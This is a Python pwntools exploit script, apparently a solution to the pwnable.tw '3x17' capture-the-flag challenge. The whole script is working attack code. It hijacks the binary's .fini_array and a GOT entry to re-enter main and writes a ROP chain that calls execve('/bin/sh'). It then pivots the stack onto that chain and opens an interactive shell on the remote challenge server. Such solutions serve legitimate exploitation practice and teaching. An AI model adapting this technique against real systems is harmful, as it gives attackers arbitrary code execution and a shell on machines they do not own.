#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\x00"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("3x17_patched", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /

# b *0x4413b0
# b *0x4708a0
# b *0x444860
# b *0x428eb0
# b *0x4718b0
# b *0x4704b0
# b *0x4419e0
# b *0x43dd10
# b *0x46fef0
# b *0x443b20
# b *0x4287a0
# b *0x4293f0
# b *0x43c050
# b *0x445370
# b *0x471a60
# b *0x4243d0
# b *0x445300
# b *0x444850
# b *0x444060
# b *0x481b40
# b *0x43e0a0
# b *0x43dae0
# b *0x401b00
# b *0x402988
b *0x402960
# b *0x401580

# b *0x402281
# b *0x401a50
set follow-fork-mode parent
set detach-on-fork on
continue
'''


def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10105
        return remote(host, port)

p = conn()

def write(addr, data):
    slan(p, b'addr', addr)
    sa(p, b'data', data)
    sleep(0.1)

fini_array = 0x4b40f0
main_0x36 = 0x401ba3
got_entry = 0x4b7058

write(fini_array, p64(main_0x36))

write(got_entry, p64(main_0x36))

pop_rax = 0x41e4af
pop_rdi = 0x401696
pop_rsi = 0x406c30
pop_rdx = 0x446e35
syscall = 0x4022b4
leave = 0x401c4b
nop = 0x401aaf

a = [p64(leave),
     p64(nop),
     p64(pop_rdi), p64(fini_array + 8 * 11),
     p64(pop_rsi), p64(0),
     p64(pop_rdx), p64(0),
     p64(pop_rax), p64(0x3b),
     p64(syscall),
     b'/bin/sh\0']

for i in range(len(a)):
    write(fini_array + 8 * i, a[i])

stack_pivot_to_bss = 0x402961
write(got_entry, p64(stack_pivot_to_bss))

rr(p, 1)
ia(p)